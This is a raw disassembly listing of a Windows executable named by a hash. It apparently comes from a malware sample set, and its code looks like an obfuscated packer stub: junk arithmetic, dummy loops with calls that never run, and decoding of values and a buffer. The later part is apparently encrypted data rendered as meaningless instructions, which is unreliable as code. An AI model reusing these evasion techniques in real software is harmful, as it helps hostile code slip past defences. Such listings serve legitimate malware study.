
29355d225dcd8e98194be971b99776804d961acb9bc8003e417d383d2bc33504.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0xa4
  401009:	mov    ecx,DWORD PTR [ebp+0x8]
  40100c:	and    DWORD PTR ds:0x425010,0x0
  401016:	jmp    0x401026
  40101b:	mov    eax,ds:0x425010
  401020:	inc    eax
  401021:	mov    ds:0x425010,eax
  401026:	cmp    DWORD PTR ds:0x425010,0x1f
  40102d:	jae    0x401080
  401033:	cmp    DWORD PTR ds:0x425010,0x7
  40103a:	jne    0x40105d
  401040:	push   0x36e0
  401045:	push   0x6272
  40104a:	push   0x42500c
  40104f:	push   0x428f
  401054:	push   DWORD PTR [ebp-0xc]
  401057:	call   DWORD PTR ds:0x421000
  40105d:	cmp    DWORD PTR ds:0x425010,0x6
  401064:	jne    0x401075
  40106a:	mov    eax,ds:0x425010
  40106f:	inc    eax
  401070:	mov    ds:0x425010,eax
  401075:	jmp    0x40101b
  40107a:	or     DWORD PTR ds:0x427010,edx
  401080:	mov    eax,0x8a85
  401085:	or     DWORD PTR ds:0x427008,0x42601c
  40108f:	xor    ax,WORD PTR [ecx+0x20]
  401093:	and    DWORD PTR ds:0x429008,0x0
  40109d:	jmp    0x4010af
  4010a2:	mov    ecx,DWORD PTR ds:0x429008
  4010a8:	inc    ecx
  4010a9:	mov    DWORD PTR ds:0x429008,ecx
  4010af:	cmp    DWORD PTR ds:0x429008,0x1d
  4010b6:	jae    0x4010f5
  4010bc:	cmp    DWORD PTR ds:0x429008,0xc
  4010c3:	jne    0x4010d4
  4010c9:	push   0x803a
  4010ce:	call   DWORD PTR ds:0x421048
  4010d4:	cmp    DWORD PTR ds:0x429008,0xb
  4010db:	jne    0x4010f0
  4010e1:	xor    ecx,ecx
  4010e3:	xor    ecx,DWORD PTR ds:0x429008
  4010e9:	inc    ecx
  4010ea:	mov    DWORD PTR ds:0x429008,ecx
  4010f0:	jmp    0x4010a2
  4010f5:	mov    ecx,0x3b4b
  4010fa:	inc    DWORD PTR ds:0x427010
  401100:	add    ax,cx
  401103:	movzx  eax,ax
  401106:	adc    ecx,DWORD PTR ds:0x428010
  40110c:	mov    DWORD PTR [ebp-0x18],eax
  40110f:	mov    ecx,DWORD PTR ds:0x41d1ec
  401115:	mov    ecx,DWORD PTR [ecx]
  401117:	sub    DWORD PTR ds:0x429014,ecx
  40111d:	mov    BYTE PTR [ebp-0x1],0x61
  401121:	and    DWORD PTR ds:0x428008,ebx
  401127:	lea    eax,[ebp-0x1]
  40112a:	sbb    ecx,0x3fcf
  401130:	mov    DWORD PTR [ebp-0x10],eax
  401133:	xor    ecx,ecx
  401135:	xor    ecx,DWORD PTR ds:0x425024
  40113b:	adc    ecx,DWORD PTR ds:0x427004
  401141:	mov    DWORD PTR ds:0x425024,ecx
  401147:	mov    al,BYTE PTR [ebp-0x1]
  40114a:	mov    ecx,DWORD PTR ds:0x42901c
  401150:	sub    DWORD PTR ds:0x42500c,ecx
  401156:	mov    ecx,DWORD PTR [ebp-0x10]
  401159:	xor    al,0x6f
  40115b:	xor    DWORD PTR ds:0x427004,0x42500c
  401165:	sub    al,0xd
  401167:	mov    BYTE PTR [ecx],al
  401169:	adc    DWORD PTR ds:0x429008,0x362f
  401173:	mov    DWORD PTR [ebp-0x14],0xf89c85b6
  40117a:	mov    DWORD PTR ds:0x425020,0x1b
  401184:	cmp    DWORD PTR ds:0x425020,0x0
  40118b:	je     0x4011bb
  401191:	cmp    DWORD PTR ds:0x425020,0x24
  401198:	jne    0x4011a7
  40119e:	push   DWORD PTR [ebp-0x1c]
  4011a1:	call   DWORD PTR ds:0x421004
  4011a7:	mov    ecx,DWORD PTR ds:0x425020
  4011ad:	dec    ecx
  4011ae:	mov    DWORD PTR ds:0x425020,ecx
  4011b4:	jmp    0x401184
  4011b9:	sub    ecx,eax
  4011bb:	push   ebx
  4011bc:	and    DWORD PTR ds:0x42501c,ebx
  4011c2:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  4011c9:	mov    ecx,DWORD PTR [ebp-0x14]
  4011cc:	push   esi
  4011cd:	mov    eax,0x7510893
  4011d2:	or     esi,DWORD PTR ds:0x42500c
  4011d8:	xor    ecx,eax
  4011da:	and    DWORD PTR ds:0x425024,0x1a45
  4011e4:	mov    esi,0x3272db
  4011e9:	sub    DWORD PTR ds:0x428018,0x2ac6
  4011f3:	push   edi
  4011f4:	and    DWORD PTR ds:0x426014,0x5a76
  4011fe:	add    ecx,esi
  401200:	jmp    0x401210
  401205:	mov    dl,BYTE PTR [ebp-0x1]
  401208:	mov    BYTE PTR [ebp+ecx*1-0xa4],dl
  40120f:	inc    ecx
  401210:	mov    DWORD PTR ds:0x427010,0x6b59
  40121a:	cmp    ecx,0x40
  40121d:	mov    DWORD PTR ds:0x425020,0x57b3
  401227:	jb     0x401205
  40122d:	mov    edx,DWORD PTR [ebp-0x14]
  401230:	xor    edx,eax
  401232:	add    edx,esi
  401234:	mov    DWORD PTR ds:0x425010,0x7b99
  40123e:	jmp    0x4012e7
  401243:	adc    ecx,DWORD PTR ds:0x427014
  401249:	mov    edi,DWORD PTR [ebp+0x8]
  40124c:	sbb    DWORD PTR ds:0x426014,ebx
  401252:	mov    ecx,0x8a85
  401257:	sub    DWORD PTR ds:0x425014,0x206e
  401261:	xor    cx,WORD PTR [edi+edx*4+0x2]
  401266:	xor    edi,0x3e7b
  40126c:	mov    edi,0x3b4b
  401271:	and    DWORD PTR ds:0x425000,0x427018
  40127b:	add    cx,di
  40127e:	add    DWORD PTR ds:0x42901c,0x429008
  401288:	movzx  ecx,cx
  40128b:	sbb    DWORD PTR ds:0x428004,0x754
  401295:	mov    DWORD PTR [ebp-0x10],ecx
  401298:	sub    DWORD PTR ds:0x42800c,0x1052
  4012a2:	mov    ecx,DWORD PTR [ebp+0x8]
  4012a5:	xor    DWORD PTR ds:0x426018,0x427004
  4012af:	movzx  ecx,WORD PTR [ecx+edx*4]
  4012b3:	or     DWORD PTR ds:0x429018,0x4238
  4012bd:	xor    ecx,0x8a85
  4012c3:	sbb    DWORD PTR ds:0x426014,0x4641
  4012cd:	add    ecx,edi
  4012cf:	mov    DWORD PTR ds:0x428018,ecx
  4012d5:	mov    edi,DWORD PTR [ebp-0x10]
  4012d8:	mov    BYTE PTR [ebp+edi*1-0xa4],cl
  4012df:	movzx  ecx,BYTE PTR ds:0x425000
  4012e6:	inc    edx
  4012e7:	mov    ecx,DWORD PTR [ebp-0x18]
  4012ea:	mov    DWORD PTR ds:0x428014,0x5338
  4012f4:	cmp    edx,ecx
  4012f6:	mov    DWORD PTR ds:0x425020,0x6df9
  401300:	jne    0x401243
  401306:	mov    ecx,DWORD PTR [ebp-0x14]
  401309:	mov    DWORD PTR ds:0x425010,0x1f
  401313:	cmp    DWORD PTR ds:0x425010,0x0
  40131a:	je     0x401367
  401320:	cmp    DWORD PTR ds:0x425010,0x25
  401327:	jne    0x40134b
  40132d:	push   0x41ff4b
  401332:	push   0x8a20
  401337:	push   DWORD PTR [ebp-0x10]
  40133a:	push   DWORD PTR [ebp-0x14]
  40133d:	push   0x4d55
  401342:	push   DWORD PTR [ebp-0x1c]
  401345:	call   DWORD PTR ds:0x42104c
  40134b:	mov    edx,DWORD PTR ds:0x425010
  401351:	dec    edx
  401352:	mov    DWORD PTR ds:0x425010,edx
  401358:	jmp    0x401313
  40135d:	xor    DWORD PTR ds:0x428008,0x4304
  401367:	mov    edx,DWORD PTR [ebp+0x10]
  40136a:	add    DWORD PTR ds:0x425008,0x427004
  401374:	xor    ecx,eax
  401376:	or     DWORD PTR ds:0x426014,0x42701c
  401380:	add    ecx,esi
  401382:	mov    DWORD PTR [edx],ecx
  401384:	sbb    DWORD PTR ds:0x429004,0x53ee
  40138e:	mov    ecx,DWORD PTR [ebp-0x14]
  401391:	xor    ecx,eax
  401393:	add    ecx,esi
  401395:	mov    DWORD PTR [ebp-0x20],ecx
  401398:	mov    DWORD PTR [ebp+0x8],0xf89c85b6
  40139f:	mov    DWORD PTR [ebp-0xc],0xf89c85a6
  4013a6:	mov    DWORD PTR [ebp-0x1c],0xf89c95b6
  4013ad:	mov    ecx,DWORD PTR [ebp-0xc]
  4013b0:	mov    DWORD PTR [ebp+0x8],ecx
  4013b3:	mov    DWORD PTR ds:0x42801c,0x197a
  4013bd:	jmp    0x4015fd
  4013c2:	movzx  edx,BYTE PTR ds:0x426010
  4013c9:	sbb    DWORD PTR ds:0x42600c,edx
  4013cf:	mov    ecx,DWORD PTR [ebp+0x8]
  4013d2:	xor    edx,edx
  4013d4:	xor    edx,DWORD PTR ds:0x426018
  4013da:	or     edx,DWORD PTR ds:0x42500c
  4013e0:	mov    DWORD PTR ds:0x426018,edx
  4013e6:	mov    edx,DWORD PTR [ebp-0x8]
  4013e9:	xor    ecx,eax
  4013eb:	mov    DWORD PTR ds:0x427008,0x2495
  4013f5:	xor    edx,eax
  4013f7:	add    DWORD PTR ds:0x426010,0x397c
  401401:	sub    ecx,edx
  401403:	sub    DWORD PTR ds:0x425020,0x386b
  40140d:	sub    ecx,esi
  40140f:	xor    edx,edx
  401411:	or     edx,DWORD PTR ds:0x428004
  401417:	sub    DWORD PTR ds:0x42501c,edx
  40141d:	xor    ecx,eax
  40141f:	mov    DWORD PTR [ebp+0x8],ecx
  401422:	mov    ecx,DWORD PTR [ebp+0x8]
  401425:	mov    edx,DWORD PTR [ebp-0x64]
  401428:	lea    ecx,[edx+ecx*1+0x5708f5]
  40142f:	mov    DWORD PTR [ebp-0x64],ecx
  401432:	mov    DWORD PTR ds:0x428004,0x1f
  40143c:	cmp    DWORD PTR ds:0x428004,0x0
  401443:	je     0x40147a
  401449:	cmp    DWORD PTR ds:0x428004,0x29
  401450:	jne    0x401466
  401456:	push   0x41ffc1
  40145b:	push   0x870a
  401460:	call   DWORD PTR ds:0x421008
  401466:	mov    ecx,DWORD PTR ds:0x428004
  40146c:	dec    ecx
  40146d:	mov    DWORD PTR ds:0x428004,ecx
  401473:	jmp    0x40143c
  401478:	and    edx,ecx
  40147a:	mov    ecx,DWORD PTR [ebp+0x8]
  40147d:	or     edx,DWORD PTR ds:0x429014
  401483:	mov    edx,DWORD PTR [ebp-0x60]
  401486:	sbb    DWORD PTR ds:0x42501c,0x5031
  401490:	lea    ecx,[edx+ecx*1+0x5708f5]
  401497:	inc    edx
  401498:	mov    DWORD PTR [ebp-0x60],ecx
  40149b:	mov    ecx,DWORD PTR [ebp+0x8]
  40149e:	mov    edx,DWORD PTR [ebp-0x5c]
  4014a1:	sub    DWORD PTR ds:0x429018,0x425020
  4014ab:	lea    ecx,[edx+ecx*1+0x5708f4]
  4014b2:	and    DWORD PTR ds:0x429010,0x0
  4014bc:	mov    edx,DWORD PTR ds:0x429010
  4014c2:	inc    edx
  4014c3:	mov    DWORD PTR ds:0x429010,edx
  4014c9:	cmp    DWORD PTR ds:0x429010,0x1b
  4014d0:	jne    0x4014e1
  4014d6:	push   0x8182
  4014db:	call   DWORD PTR ds:0x421014
  4014e1:	cmp    DWORD PTR ds:0x429010,0x11
  4014e8:	jb     0x4014bc
  4014ee:	mov    DWORD PTR [ebp-0x5c],ecx
  4014f1:	sbb    edx,0x6f22
  4014f7:	mov    ecx,DWORD PTR [ebp+0x8]
  4014fa:	and    DWORD PTR ds:0x425008,0x0
  401504:	mov    edx,DWORD PTR ds:0x425008
  40150a:	inc    edx
  40150b:	mov    DWORD PTR ds:0x425008,edx
  401511:	cmp    DWORD PTR ds:0x425008,0x16
  401518:	jne    0x40152e
  40151e:	push   0x41ffe1
  401523:	push   0x41ff1b
  401528:	call   DWORD PTR ds:0x421050
  40152e:	cmp    DWORD PTR ds:0x425008,0x14
  401535:	jb     0x401504
  40153b:	mov    edx,DWORD PTR [ebp-0x58]
  40153e:	xor    DWORD PTR ds:0x429008,0x42900c
  401548:	lea    ecx,[edx+ecx*1+0x5708fb]
  40154f:	and    DWORD PTR ds:0x42801c,0x0
  401559:	mov    edx,DWORD PTR ds:0x42801c
  40155f:	inc    edx
  401560:	mov    DWORD PTR ds:0x42801c,edx
  401566:	cmp    DWORD PTR ds:0x42801c,0x1f
  40156d:	jne    0x401583
  401573:	push   0x3426
  401578:	push   0x86d1
  40157d:	call   DWORD PTR ds:0x421054
  401583:	cmp    DWORD PTR ds:0x42801c,0x17
  40158a:	jb     0x401559
  401590:	mov    DWORD PTR [ebp-0x58],ecx
  401593:	mov    ecx,DWORD PTR [ebp+0x8]
  401596:	mov    edx,DWORD PTR [ebp-0x54]
  401599:	lea    ecx,[edx+ecx*1+0x5708fa]
  4015a0:	and    DWORD PTR ds:0x426010,0x0
  4015aa:	mov    edx,DWORD PTR ds:0x426010
  4015b0:	inc    edx
  4015b1:	mov    DWORD PTR ds:0x426010,edx
  4015b7:	cmp    DWORD PTR ds:0x426010,0x2b
  4015be:	jne    0x4015cd
  4015c4:	push   DWORD PTR [ebp-0x24]
  4015c7:	call   DWORD PTR ds:0x421018
  4015cd:	cmp    DWORD PTR ds:0x426010,0x1e
  4015d4:	jb     0x4015aa
  4015da:	mov    DWORD PTR [ebp-0x54],ecx
  4015dd:	or     ecx,0x6900
  4015e3:	mov    ecx,DWORD PTR [ebp+0x8]
  4015e6:	and    DWORD PTR ds:0x426000,0x2d7e
  4015f0:	mov    edx,DWORD PTR [ebp-0x50]
  4015f3:	lea    ecx,[edx+ecx*1+0x5708f9]
  4015fa:	mov    DWORD PTR [ebp-0x50],ecx
  4015fd:	xor    ecx,0x7fc1
  401603:	mov    ecx,DWORD PTR [ebp+0x8]
  401606:	xor    ecx,eax
  401608:	add    ecx,esi
  40160a:	jne    0x4013c2
  401610:	mov    DWORD PTR ds:0x425028,0xb4d
  40161a:	jmp    0x401891
  40161f:	and    DWORD PTR ds:0x425024,0x0
  401629:	jmp    0x40163b
  40162e:	mov    edx,DWORD PTR ds:0x425024
  401634:	inc    edx
  401635:	mov    DWORD PTR ds:0x425024,edx
  40163b:	cmp    DWORD PTR ds:0x425024,0x13
  401642:	jae    0x40168a
  401648:	cmp    DWORD PTR ds:0x425024,0x4
  40164f:	jne    0x40166b
  401655:	push   0x84c6
  40165a:	push   DWORD PTR [ebp-0xc]
  40165d:	push   DWORD PTR [ebp-0x10]
  401660:	push   0x5448
  401665:	call   DWORD PTR ds:0x42101c
  40166b:	cmp    DWORD PTR ds:0x425024,0x3
  401672:	jne    0x401685
  401678:	mov    edx,DWORD PTR ds:0x425024
  40167e:	inc    edx
  40167f:	mov    DWORD PTR ds:0x425024,edx
  401685:	jmp    0x40162e
  40168a:	mov    ecx,DWORD PTR [ebp-0x1c]
  40168d:	or     DWORD PTR ds:0x427010,0x1874
  401697:	mov    edx,DWORD PTR [ebp-0x8]
  40169a:	or     DWORD PTR ds:0x42900c,0x427008
  4016a4:	xor    ecx,eax
  4016a6:	add    DWORD PTR ds:0x425028,0x427010
  4016b0:	xor    edx,eax
  4016b2:	sub    ecx,edx
  4016b4:	sub    ecx,esi
  4016b6:	xor    ecx,eax
  4016b8:	mov    DWORD PTR ds:0x426018,0x1f6a
  4016c2:	mov    DWORD PTR [ebp-0x1c],ecx
  4016c5:	mov    ecx,DWORD PTR [ebp-0xc]
  4016c8:	mov    DWORD PTR [ebp+0x8],ecx
  4016cb:	jmp    0x4016fd
  4016d0:	mov    ecx,DWORD PTR [ebp+0x8]
  4016d3:	mov    edx,DWORD PTR [ebp-0x8]
  4016d6:	xor    ecx,eax
  4016d8:	xor    edx,eax
  4016da:	sub    ecx,edx
  4016dc:	sub    ecx,esi
  4016de:	xor    ecx,eax
  4016e0:	mov    DWORD PTR [ebp+0x8],ecx
  4016e3:	mov    ecx,DWORD PTR [ebp+0x8]
  4016e6:	mov    edx,DWORD PTR [ebp+0x8]
  4016e9:	imul   edx,edx,0x5708f5
  4016ef:	xor    ecx,eax
  4016f1:	add    ecx,esi
  4016f3:	lea    ecx,[ebp+ecx*4-0x64]
  4016f7:	mov    edi,DWORD PTR [ecx]
  4016f9:	add    edx,edi
  4016fb:	mov    DWORD PTR [ecx],edx
  4016fd:	mov    ecx,DWORD PTR [ebp+0x8]
  401700:	xor    ecx,eax
  401702:	add    ecx,esi
  401704:	jne    0x4016d0
  40170a:	mov    ecx,DWORD PTR [ebp-0x20]
  40170d:	mov    cl,BYTE PTR [ebp+ecx*1-0xa4]
  401714:	mov    dl,BYTE PTR [ebp-0x1]
  401717:	cmp    cl,dl
  401719:	je     0x4017f2
  40171f:	mov    ecx,DWORD PTR [ebp-0x20]
  401722:	mov    cl,BYTE PTR [ebp+ecx*1-0xa4]
  401729:	mov    edx,DWORD PTR [ebp+0xc]
  40172c:	cmp    cl,BYTE PTR [edx]
  40172e:	jne    0x4018a3
  401734:	mov    ecx,DWORD PTR [ebp-0x14]
  401737:	mov    edx,DWORD PTR [ebp+0xc]
  40173a:	movsx  edx,BYTE PTR [edx]
  40173d:	xor    ecx,eax
  40173f:	add    ecx,esi
  401741:	cmp    edx,ecx
  401743:	mov    ecx,DWORD PTR [ebp-0xc]
  401746:	mov    DWORD PTR [ebp+0x8],ecx
  401749:	mov    ecx,DWORD PTR [ebp+0x8]
  40174c:	je     0x403ca2
  401752:	jmp    0x401787
  401757:	mov    ecx,DWORD PTR [ebp+0x8]
  40175a:	mov    edx,DWORD PTR [ebp-0x8]
  40175d:	xor    ecx,eax
  40175f:	xor    edx,eax
  401761:	sub    ecx,edx
  401763:	sub    ecx,esi
  401765:	xor    ecx,eax
  401767:	mov    DWORD PTR [ebp+0x8],ecx
  40176a:	mov    ecx,DWORD PTR [ebp+0x8]
  40176d:	mov    edx,DWORD PTR [ebp+0x8]
  401770:	xor    ecx,eax
  401772:	imul   edx,edx,0x5708f5
  401778:	add    ecx,esi
  40177a:	lea    ecx,[ebp+ecx*4-0x64]
  40177e:	mov    edi,DWORD PTR [ecx]
  401780:	add    edx,edi
  401782:	mov    DWORD PTR [ecx],edx
  401784:	mov    ecx,DWORD PTR [ebp+0x8]
  401787:	xor    ecx,eax
  401789:	add    ecx,esi
  40178b:	jne    0x401757
  401791:	mov    ecx,DWORD PTR [ebp-0x14]
  401794:	mov    edx,DWORD PTR [ebp+0x8]
  401797:	xor    ecx,eax
  401799:	xor    edx,eax
  40179b:	add    ecx,esi
  40179d:	add    edx,esi
  40179f:	cmp    ecx,edx
  4017a1:	jae    0x401837
  4017a7:	lea    edx,[ecx-0x3272db]
  4017ad:	mov    DWORD PTR [ebp-0x18],edx
  4017b0:	mov    edi,DWORD PTR [ebp-0x18]
  4017b3:	mov    DWORD PTR [ebp-0x24],0x705fd08
  4017ba:	lea    edx,[ebp-0x24]
  4017bd:	mov    DWORD PTR [ebp-0x10],edx
  4017c0:	mov    edx,DWORD PTR [ebp-0x10]
  4017c3:	add    DWORD PTR [edx],0x705fa08
  4017c9:	mov    ebx,DWORD PTR [ebp-0x10]
  4017cc:	xor    edi,eax
  4017ce:	add    edi,DWORD PTR [ebx]
  4017d0:	lea    edx,[ebp+ecx*4-0x64]
  4017d4:	mov    ebx,DWORD PTR [edx]
  4017d6:	xor    edi,ebx
  4017d8:	mov    DWORD PTR [edx],edi
  4017da:	mov    edx,DWORD PTR [ebp+0x8]
  4017dd:	xor    edx,eax
  4017df:	inc    ecx
  4017e0:	inc    DWORD PTR [ebp-0x18]
  4017e3:	add    edx,esi
  4017e5:	cmp    ecx,edx
  4017e7:	jb     0x4017b0
  4017ed:	jmp    0x401837
  4017f2:	mov    ecx,DWORD PTR [ebp-0xc]
  4017f5:	mov    DWORD PTR [ebp+0x8],ecx
  4017f8:	jmp    0x40182a
  4017fd:	mov    ecx,DWORD PTR [ebp+0x8]
  401800:	mov    edx,DWORD PTR [ebp-0x8]
  401803:	xor    ecx,eax
  401805:	xor    edx,eax
  401807:	sub    ecx,edx
  401809:	sub    ecx,esi
  40180b:	xor    ecx,eax
  40180d:	mov    DWORD PTR [ebp+0x8],ecx
  401810:	mov    ecx,DWORD PTR [ebp+0x8]
  401813:	mov    edx,DWORD PTR [ebp+0x8]
  401816:	imul   edx,edx,0x5708f5
  40181c:	xor    ecx,eax
  40181e:	add    ecx,esi
  401820:	lea    ecx,[ebp+ecx*4-0x64]
  401824:	mov    edi,DWORD PTR [ecx]
  401826:	add    edx,edi
  401828:	mov    DWORD PTR [ecx],edx
  40182a:	mov    ecx,DWORD PTR [ebp+0x8]
  40182d:	xor    ecx,eax
  40182f:	add    ecx,esi
  401831:	jne    0x4017fd
  401837:	mov    ecx,DWORD PTR [ebp-0xc]
  40183a:	mov    DWORD PTR [ebp+0x8],ecx
  40183d:	jmp    0x40186f
  401842:	mov    ecx,DWORD PTR [ebp+0x8]
  401845:	mov    edx,DWORD PTR [ebp-0x8]
  401848:	xor    ecx,eax
  40184a:	xor    edx,eax
  40184c:	sub    ecx,edx
  40184e:	sub    ecx,esi
  401850:	xor    ecx,eax
  401852:	mov    DWORD PTR [ebp+0x8],ecx
  401855:	mov    ecx,DWORD PTR [ebp+0x8]
  401858:	mov    edx,DWORD PTR [ebp+0x8]
  40185b:	imul   edx,edx,0x5708f5
  401861:	xor    ecx,eax
  401863:	add    ecx,esi
  401865:	lea    ecx,[ebp+ecx*4-0x64]
  401869:	mov    edi,DWORD PTR [ecx]
  40186b:	add    edx,edi
  40186d:	mov    DWORD PTR [ecx],edx
  40186f:	mov    ecx,DWORD PTR [ebp+0x8]
  401872:	xor    ecx,eax
  401874:	add    ecx,esi
  401876:	jne    0x401842
  40187c:	mov    ecx,DWORD PTR [ebp-0x8]
  40187f:	mov    edx,DWORD PTR [ebp-0x20]
  401882:	xor    ecx,eax
  401884:	lea    ecx,[ecx+edx*1+0x3272db]
  40188b:	mov    DWORD PTR [ebp-0x20],ecx
  40188e:	inc    DWORD PTR [ebp+0xc]
  401891:	mov    ecx,DWORD PTR [ebp-0x1c]
  401894:	xor    ecx,eax
  401896:	add    ecx,esi
  401898:	jne    0x40161f
  40189e:	jmp    0x403cac
  4018a3:	mov    ecx,DWORD PTR [ebp-0xc]
  4018a6:	mov    DWORD PTR [ebp+0x8],ecx
  4018a9:	jmp    0x4018db
  4018ae:	mov    ecx,DWORD PTR [ebp+0x8]
  4018b1:	mov    edx,DWORD PTR [ebp-0x8]
  4018b4:	xor    ecx,eax
  4018b6:	xor    edx,eax
  4018b8:	sub    ecx,edx
  4018ba:	sub    ecx,esi
  4018bc:	xor    ecx,eax
  4018be:	mov    DWORD PTR [ebp+0x8],ecx
  4018c1:	mov    ecx,DWORD PTR [ebp+0x8]
  4018c4:	mov    edx,DWORD PTR [ebp+0x8]
  4018c7:	imul   edx,edx,0x5708f5
  4018cd:	xor    ecx,eax
  4018cf:	add    ecx,esi
  4018d1:	lea    ecx,[ebp+ecx*4-0x64]
  4018d5:	mov    edi,DWORD PTR [ecx]
  4018d7:	add    edx,edi
  4018d9:	mov    DWORD PTR [ecx],edx
  4018db:	mov    ecx,DWORD PTR [ebp+0x8]
  4018de:	xor    ecx,eax
  4018e0:	add    ecx,esi
  4018e2:	jne    0x4018ae
  4018e8:	jmp    0x403cb8
  4018ed:	mov    ecx,DWORD PTR [ebp+0x8]
  4018f0:	mov    edx,DWORD PTR [ebp-0x8]
  4018f3:	xor    ecx,eax
  4018f5:	xor    edx,eax
  4018f7:	sub    ecx,edx
  4018f9:	sub    ecx,esi
  4018fb:	jmp    0x403c80
  401900:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401901:	js     0x401926
  401903:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401904:	mov    ds:0x673a7a3,eax
  401909:	je     0x401894
  40190b:	stos   DWORD PTR es:[edi],eax
  40190c:	adc    al,0x3e
  40190e:	inc    edi
  40190f:	or     BYTE PTR [edx+0x62],ah
  401912:	bound  esp,QWORD PTR [edx+0x1a]
  401915:	pop    edi
  401916:	bound  esp,QWORD PTR [edx+0x9]
  401919:	xor    BYTE PTR [edi],al
  40191b:	cmp    eax,0xf033905
  401920:	jns    0x4018b2
  401922:	jbe    0x40199a
  401924:	(bad)  
  401926:	jb     0x40199a
  401928:	jno    0x401954
  40192a:	fld    st(0)
  40192c:	std    
  40192d:	dec    esp
  40192e:	push   esp
  40192f:	jae    0x4019ae
  401931:	inc    ebx
  401932:	mov    WORD PTR [ecx+esi*2+0x45],?
  401936:	scas   eax,DWORD PTR es:[edi]
  401937:	inc    ecx
  401938:	push   edx
  401939:	cmp    al,0x90
  40193b:	loop   0x4018d4
  40193d:	data16 jnp 0x40196b
  401940:	call   0x26d1:0xfbbbb819
  401947:	hlt    
  401948:	xor    BYTE PTR [ebx+0x5811b5de],bl
  40194e:	dec    ebp
  40194f:	and    bl,cl
  401951:	std    
  401952:	pop    ds
  401953:	int    0x30
  401955:	xor    BYTE PTR [ebx+0x79a0c1de],cl
  40195b:	test   al,0x21
  40195d:	mov    al,ds:0x6ad39963
  401962:	clc    
  401963:	cmp    DWORD PTR [edi-0x74],esi
  401966:	mov    ecx,DWORD PTR [ebx+0x38d84edc]
  40196c:	mov    ecx,0x536582b9
  401971:	mov    ch,0x26
  401973:	idiv   BYTE PTR es:[ebx+0x2a413552]
  40197a:	push   es
  40197b:	arpl   sp,bx
  40197d:	push   edi
  40197e:	jne    0x401920
  401980:	and    ch,bh
  401982:	stos   BYTE PTR es:[edi],al
  401983:	adc    al,0xd1
  401985:	cmp    esi,eax
  401987:	mov    al,0x56
  401989:	dec    edi
  40198a:	ret    
  40198b:	adc    al,0x67
  40198d:	and    ebx,DWORD PTR [eax-0x5a2f20df]
  401993:	jmp    0x43e55a22
  401998:	fwait
  401999:	into   
  40199a:	or     al,0xa3
  40199c:	div    DWORD PTR [edi+0x5]
  40199f:	mov    esi,0x9d47fa53
  4019a4:	add    ebx,esi
  4019a6:	retw   0x3f19
  4019aa:	sti    
  4019ab:	retf   0xf32e
  4019ae:	xor    esi,DWORD PTR [ebx]
  4019b0:	or     edi,edx
  4019b2:	and    BYTE PTR [edx+0x78],ah
  4019b5:	or     BYTE PTR [edi+0x32],bl
  4019b8:	mov    esi,0x1331d1f1
  4019bd:	and    eax,0xd66d3738
  4019c2:	mov    ch,0x1d
  4019c4:	je     0x4019ad
  4019c6:	mov    edi,0x49885773
  4019cb:	xchg   esi,eax
  4019cc:	sbb    ecx,ecx
  4019ce:	(bad)  
  4019cf:	imul   edx,DWORD PTR [ecx+0x6a],0x35
  4019d3:	pop    es
  4019d4:	jmp    0x7b22ec43
  4019d9:	mov    al,0x9d
  4019db:	xor    al,bh
  4019dd:	or     bh,BYTE PTR [edx+edi*4-0x634da409]
  4019e4:	sub    al,0xf9
  4019e6:	xor    BYTE PTR [ebx],al
  4019e8:	jno    0x401a55
  4019ea:	popa   
  4019eb:	bnd data16 jl 0x4019bb
  4019ef:	not    BYTE PTR [eax-0x61]
  4019f2:	xchg   ebx,eax
  4019f3:	imul   edx,DWORD PTR [esi-0x62],0xdaba5bf8
  4019fa:	loopne 0x401a6f
  4019fc:	inc    ecx
  4019fd:	mov    cl,BYTE PTR [edx+eax*8]
  401a00:	jo     0x401996
  401a02:	pusha  
  401a03:	stos   BYTE PTR es:[edi],al
  401a04:	xlat   BYTE PTR ds:[ebx]
  401a05:	mov    bl,0xdd
  401a07:	and    bh,BYTE PTR [eax-0x63]
  401a0a:	ror    bh,0x61
  401a0d:	loope  0x401a57
  401a0f:	(bad)  
  401a10:	jmp    0xdc04:0xd24b0b62
  401a17:	add    DWORD PTR [eax],esi
  401a19:	cmp    al,0xea
  401a1b:	popf   
  401a1c:	fisubr WORD PTR [esi-0x60ef184e]
  401a22:	cdq    
  401a23:	pushf  
  401a24:	add    al,0x5c
  401a26:	popa   
  401a27:	outs   dx,BYTE PTR ds:[esi]
  401a28:	out    0xed,al
  401a2a:	mov    esi,0x2b073117
  401a2f:	jo     0x4019f6
  401a31:	aas    
  401a32:	cmp    DWORD PTR [eax+0xef6797e],eax
  401a38:	jo     0x4019bc
  401a3a:	dec    esp
  401a3b:	jmp    0x5f75:0x9122c238
  401a42:	push   edx
  401a43:	(bad)  
  401a44:	into   
  401a45:	(bad)  
  401a47:	and    bl,BYTE PTR [edi]
  401a49:	dec    edi
  401a4a:	stos   DWORD PTR es:[edi],eax
  401a4b:	daa    
  401a4c:	dec    edi
  401a4d:	loopne 0x401a65
  401a4f:	test   BYTE PTR [esi+0x36],bl
  401a52:	push   eax
  401a53:	xchg   esp,eax
  401a54:	fiadd  WORD PTR [edi]
  401a56:	shl    ch,cl
  401a58:	loop   0x401ace
  401a5a:	jle    0x401aa1
  401a5c:	dec    eax
  401a5d:	or     DWORD PTR [edi+0x7c],esi
  401a60:	das    
  401a61:	adc    eax,esi
  401a63:	add    al,0xb9
  401a65:	adc    eax,0xdc58da2f
  401a6a:	int    0x5b
  401a6c:	mov    cl,0x50
  401a6e:	lods   eax,DWORD PTR ds:[esi]
  401a6f:	(bad)  
  401a70:	mov    ebp,0x5d8cdd09
  401a75:	clc    
  401a76:	out    0xf3,al
  401a78:	adc    ch,BYTE PTR [esi-0x65fd0df4]
  401a7e:	imul   edi,DWORD PTR [ecx+edi*8+0xd],0x2422f757
  401a86:	cld    
  401a87:	dec    eax
  401a88:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  401a8a:	sbb    DWORD PTR [eax-0x58e20b91],ebx
  401a90:	in     al,0x2b
  401a92:	push   ds
  401a93:	jo     0x401a72
  401a95:	adc    edi,edi
  401a97:	outs   dx,BYTE PTR ds:[esi]
  401a98:	rol    DWORD PTR [edx+0x19],cl
  401a9b:	mov    dh,0x2d
  401a9d:	jge    0x401a59
  401a9f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
